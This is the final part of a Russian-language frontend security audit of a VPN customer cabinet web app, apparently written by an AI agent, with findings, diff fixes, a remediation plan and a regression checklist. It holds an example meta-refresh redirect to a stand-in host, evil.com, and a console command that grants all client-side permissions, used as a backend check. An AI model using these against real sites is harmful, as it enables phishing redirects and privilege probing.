<iframe ref={iframeRef} className="h-full w-full" sandbox="allow-same-origin" title="Email Preview" />
```

`allow-same-origin` без `allow-scripts` означает: JS внутри iframe не выполняется (✓), **но** iframe доступен parent‑странице через `frameElement` для чтения DOM, плюс при клике по `<a target="_top">` он может перевести админа на произвольный URL.

**Impact.** Низкая, но если шаблон сделал злонамеренный коллега/инсайдер — он может содержать `<meta http-equiv="refresh" content="0; url=//evil.com">`, который будет выполнен в parent‑контексте. CWE‑1021.

**Recommendation.** Полностью пустой sandbox:

```diff
- sandbox="allow-same-origin"
+ sandbox=""
```

(Совсем без атрибута `sandbox` тоже даст иммунитет к JS, но c пустым атрибутом блокирует и `top‑navigation` и формы.)

---

### 🔵 F-17. URL‑чистка в OAuthCallback после fetch

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/OAuthCallback.tsx:75-77`

```ts
const handle = async () => {
  // Clear sensitive OAuth params (code, state) from URL immediately for all modes
  window.history.replaceState({}, '', '/auth/oauth/callback');
  ...
};
handle();
```

`replaceState` происходит первой строкой `handle`, но между моментом монтирования и вызовом `handle` остаётся сырое значение в `window.location.href`. Sentry/расширения, читающие `location` при mount, успеют его захватить.

**Recommendation.** Сделать `replaceState` синхронно в самом `useEffect` до любых проверок:

```diff
   useEffect(() => {
     if (hasRun.current) return;
     hasRun.current = true;
+
+    // Очищаем чувствительные query‑параметры до любых side‑effects
+    const sanitizedUrl = window.location.pathname;
+    window.history.replaceState({}, '', sanitizedUrl);
 
     const code = searchParams.get('code');
```

---

### 🔵 F-18. Внешние ресурсы без SRI

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/index.html:16-29, 30-43`

`fonts.googleapis.com`, `fonts.gstatic.com`, `https://telegram.org/js/telegram-web-app.js` подгружаются без `integrity=`. Для стилей Google `<link>` Subresource Integrity не работает (CSS постоянно меняется), но для script от telegram.org — техническая возможность есть, хотя Telegram явно не публикует SRI‑хеши.

**Recommendation.** Главный митигатор — strict CSP (см. F-01, `script-src 'self' https://telegram.org`). Для шрифтов можно self‑host через `@fontsource/...`, чтобы избавиться от внешних доменов целиком.

---

### 🔵 F-19. Inline‑скрипт в `index.html`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/index.html:30-43`

```html
<script>
  (function() {
    var isTelegram = window.TelegramWebviewProxy || ...;
    if (isTelegram) {
      var s = document.createElement('script');
      s.src = 'https://telegram.org/js/telegram-web-app.js';
      ...
    }
  })();
</script>
```

CSP `script-src 'self'` сломает страницу. С `'unsafe-inline'` — теряется ½ смысла CSP.

**Recommendation.** Перенести логику в `src/main.tsx` (там уже есть детект Telegram), удалить inline `<script>`:

```diff
-    <script>
-      // Load Telegram Web App script only inside Telegram environment
-      (function() { ... })();
-    </script>
```

Загружать `telegram-web-app.js` через `import()` в `main.tsx` после детекта окружения.

---

### 🔵 F-20. Контейнер запускается под root

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/Dockerfile:31-43` — нет `USER`.

**Recommendation.**

```diff
 FROM nginx:alpine
 COPY --from=builder /app/dist /usr/share/nginx/html
 COPY nginx.conf /etc/nginx/conf.d/default.conf
+# Запуск под non-root: nginx уже создаёт user `nginx`
+RUN sed -i 's/listen       80;/listen       8080;/g' /etc/nginx/conf.d/default.conf || true
+USER nginx
-EXPOSE 80
+EXPOSE 8080
 HEALTHCHECK ...
```

(При биндинге `<1024` под non-root нужен `cap_net_bind_service` или сменить порт на 8080.)

---

### 🔵 F-21. ErrorBoundary логирует всегда

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/components/ErrorBoundary.tsx:37`

```ts
console.error('[ErrorBoundary]', error, errorInfo);
```

**Recommendation.**

```diff
- console.error('[ErrorBoundary]', error, errorInfo);
+ if (import.meta.env.DEV) console.error('[ErrorBoundary]', error, errorInfo);
```

И при подключении Sentry — отправлять туда без console.

---

### 🔵 F-22. `.env` с реальным URL в working tree

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/.env`:

```env
VITE_API_URL=https://cabinet.vernovpn.ru/api
VITE_TELEGRAM_BOT_USERNAME=VernoVPNbot
```

Файл не закоммичен (`git ls-files | grep .env` → только `.env.example`), `.gitignore` его исключает (`@/Users/Nichi/progr/verno/bedolaga-cabinet/.gitignore:11-14`), `.dockerignore` тоже (`@/Users/Nichi/progr/verno/bedolaga-cabinet/.dockerignore:21-23`). С точки зрения VCS всё в порядке.

Однако значения `VITE_*` всё равно публичны (попадают в JS‑бандл), поэтому нет «секрета» как такового — но есть оперативная информация (production хост, имя бота). Также сам факт наличия в `.env` реальных значений на dev‑машинах даёт повод для бэкап‑утечки.

**Recommendation.**
1. Хранить prod значения в CI Secrets / Vault, в .env — только заглушки.
2. Документировать в README: `.env` для разработки, prod значения через `--build-arg` в Docker.

---

### ⚪ F-23. RBAC — только клиентский

**Доказательство.** `src/store/permissions.ts`, `src/components/auth/PermissionRoute.tsx`. Все проверки делаются по списку `permissions: string[]`, полученному с `/cabinet/auth/me/permissions`. Никакие admin‑эндпоинты не имеют клиентской «защиты сильнее редиректа».

**Impact.** Это не уязвимость, если бэкенд проверяет права на каждом эндпоинте. Зафиксировано как «требует проверки на сервере». Любой пользователь может из консоли сделать `usePermissionStore.setState({ permissions: ['*:*'], isLoaded: true })` и увидеть весь админский UI — но любые мутирующие запросы должны падать с 403.

**Recommendation.** На бэкенде: middleware/guard на каждом `/cabinet/admin/*` эндпоинте. На фронте: добавить комментарии, что `PermissionRoute` — UX, не security boundary. **Требует проверки на сервере.**

---

### ⚪ F-24. Слабая клиентская валидация email/password

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/utils/validation.ts:1-5`

```ts
const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

`@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/CabinetLogin.tsx:240-243` — пароль валидируется только по `length >= 8`.

**Recommendation.** Это OK для UX, **бэкенд должен валидировать строже**: complex password policy (мин. 10–12 символов, проверка на pwnedpasswords/k‑anonymity), полный RFC 5321 для email. **Требует проверки на сервере.**

---

### ⚪ F-25. `lazyWithRetry` → `window.location.reload()`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/App.tsx:9-22` — при ошибке загрузки чанка делает 1 reload в 30 секунд.

**Impact.** Reload‑loop теоретически возможен, но guard защищает. Связан с F-06: если `index.html` закеширован, после деплоя пользователь долго будет видеть «вспышки» reload’ов. Митигируется правильным `Cache-Control: no-store` на `index.html`.

---

### ⚪ F-26. Мёртвый chunk в Vite

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/vite.config.ts:57` упоминает `@lottiefiles/`, но в `package.json` его нет. Технический долг, не безопасность.

---

## Приоритизированный план устранения

**Спринт 0 (выкатить как hotfix, < 1 день):**

1. **F-01** — добавить security‑заголовки в `nginx.conf` (CSP в режиме `report-only` для первой итерации, потом enforce).
2. **F-02** — удалить или починить `/api/` location.
3. **F-12** — `noopener,noreferrer` во всех `window.open(_, '_blank')`.
4. **F-21** — обернуть `console.error` в ErrorBoundary в `import.meta.env.DEV`.

**Спринт 1 (1–2 недели):**

5. **F-04** — удалить CSRF‑театр (если не планируется cookie‑auth).
6. **F-05** — переход WebSocket‑auth на ticket / first‑message.
7. **F-07** — `replaceState` до сетевого вызова в AutoLogin.
8. **F-09** + **F-10** — убрать `allow-same-origin` из sandbox; убрать `style` из ALLOWED_ATTR.
9. **F-11** — заменить `console.error` → `logger.error` во всех страницах.
10. **F-13** — выбрать один lockfile + corepack.
11. **F-14** — `eslint-plugin-security`, `eslint-plugin-no-unsanitized`, gitleaks в pre‑commit.

**Спринт 2 (>2 недели, рефакторинг):**

12. **F-03** — миграция refresh‑токена в HttpOnly cookie (требует работы на бэке).
13. **F-08** — пересмотр кеша Telegram `initData`.
14. **F-19** — удалить inline‑script из `index.html`.
15. **F-20** — non‑root container.
16. Покрыть admin‑эндпоинты серверной проверкой прав (F-23). **Требует проверки на сервере.**

---

## Чек‑лист регрессий после фиксов

После применения патчей прогнать:

1. **Smoke‑тесты UI**: логин email/password, логин Telegram WebApp, логин через OAuth (Google/Yandex), refresh после истечения access‑токена, logout.
2. **CSP**: открыть DevTools → Console, прокликать ключевые страницы (Login, Dashboard, Connection, Subscription, Profile, AdminPanel, Wheel, GiftSubscription, NewsArticle, InfoPageView), убедиться, что нет CSP‑violation. Шаги:
   - Главная (лендинг) ✓
   - Telegram Login виджет на /login ✓
   - Подключение SVG‑иконок приложений ✓
   - Просмотр InfoPage с YouTube‑embed ✓
   - WebSocket подключение ✓
   - Yandex Metrika / Google Ads (если используются) ✓
3. **Cache**: эмулировать сценарий «деплой → старая вкладка пользователя» (изменить хеши ассетов, перезагрузить вкладку через Service Worker / hard reload). Не должно быть белого экрана.
4. **WebSocket**: подключение проходит, токен **не** виден в URL (`chrome://net-export/`). Reconnect после 401 идёт без вечного цикла.
5. **Token storage**: после logout нет `refresh_token` в `localStorage`/`sessionStorage`/cookies. После 401 нет петель refresh.
6. **OAuth/AutoLogin**: после редиректа `?code=`, `?state=`, `?token=` пропадают из адресной строки сразу.
7. **Sandbox**: внутри YouTube‑iframe попытаться `top.location = '...'` — должно падать.
8. **Reverse tabnabbing**: `window.open` в DevTools — `opener` должен быть `null`.
9. **Permissions**: с консоли подменить `usePermissionStore.setState({ permissions: ['*:*'], isLoaded: true })`, перейти на `/admin/users` и попытаться удалить пользователя — бэк должен вернуть 403.
10. **Audit зависимостей**: `pnpm audit --prod` (или `npm audit --omit=dev`) — 0 high/critical.
11. **Build**: `pnpm build` — нет sourcemap’ов в `dist/` (`find dist -name '*.map'` пусто). ✓ Уже сейчас.
12. **Dev сервер**: `pnpm dev` без `VITE_DEV_HOST=true` биндится только на 127.0.0.1.

---

## Команды для следования (с подтверждением пользователя)

```bash
# Аудит зависимостей
pnpm audit --prod
# или
npm audit --omit=dev

# Поиск секретов в истории
gitleaks detect --source . -v

# Проверка sourcemap'ов
find dist -name '*.map'

# Smoke build
pnpm build && du -sh dist/
```

> Аудит зависимостей в данной среде заблокирован network allowlist — необходимо запустить локально.

---

_Конец отчёта._
